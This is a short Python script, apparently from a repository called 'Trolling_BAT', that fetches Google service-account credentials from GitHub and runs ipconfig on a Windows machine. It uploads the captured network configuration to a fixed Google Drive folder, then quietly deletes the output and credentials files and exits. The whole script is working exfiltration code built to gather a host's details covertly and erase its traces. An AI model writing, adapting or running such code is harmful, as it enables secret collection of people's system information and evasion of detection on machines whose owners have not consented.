import os
import time
import requests
import subprocess
import sys
from google.oauth2 import service_account
from googleapiclient.discovery import build
from googleapiclient.http import MediaFileUpload

CREDENTIALS_URL = "https://raw.githubusercontent.com/MangoTheSherlock/Trolling_BAT/main/credentials.json"
CREDENTIALS_FILE = "credentials.json"

def download_credentials():
    response = requests.get(CREDENTIALS_URL)
    if response.status_code == 200:
        with open(CREDENTIALS_FILE, "wb") as f:
            f.write(response.content)
    else:
        sys.exit(1)

download_credentials()

OUTPUT_FILE = "output.txt"

with open(OUTPUT_FILE, "w") as f:
    process = subprocess.run(["ipconfig"], stdout=f, text=True, shell=True)

f.close()
time.sleep(1)

SCOPES = ["https://www.googleapis.com/auth/drive.file"]
creds = service_account.Credentials.from_service_account_file(CREDENTIALS_FILE, scopes=SCOPES)
service = build("drive", "v3", credentials=creds)

FOLDER_ID = "1zLRe3Kq1x4FDB5khIUTHaHMA9-feiHRf"

file_metadata = {"name": OUTPUT_FILE, "parents": [FOLDER_ID]}
media = MediaFileUpload(OUTPUT_FILE, mimetype="text/plain", resumable=False)

with open(OUTPUT_FILE, "r") as f:
    pass

uploaded_file = service.files().create(body=file_metadata, media_body=media, fields="id").execute()

time.sleep(2)

def safe_delete(file):
    try:
        if os.path.exists(file):
            os.chmod(file, 0o777)
            os.remove(file)
    except Exception as e:
        pass

safe_delete(OUTPUT_FILE)
safe_delete(CREDENTIALS_FILE)

sys.exit(0)
